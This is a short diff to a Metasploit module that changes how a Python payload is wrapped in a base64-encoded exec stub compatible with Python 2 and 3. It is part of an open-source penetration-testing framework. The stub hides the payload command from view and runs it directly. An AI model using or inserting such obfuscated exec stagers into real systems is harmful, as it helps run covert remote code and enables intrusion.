@@ -40,8 +40,8 @@ module Metasploit3
     cmd << "exec(d,{'s':s})\n"
 
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    b64_stub  = "import base64,sys; exec(base64.b64decode("
-    b64_stub << "{2:str}.get(sys.version_info[0],lambda b:bytes(b,'UTF-8'))('"
+    b64_stub  = "import base64,sys;exec(base64.b64decode("
+    b64_stub << "{2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"
     b64_stub << Rex::Text.encode_base64(cmd)
     b64_stub << "')))"
     return b64_stub
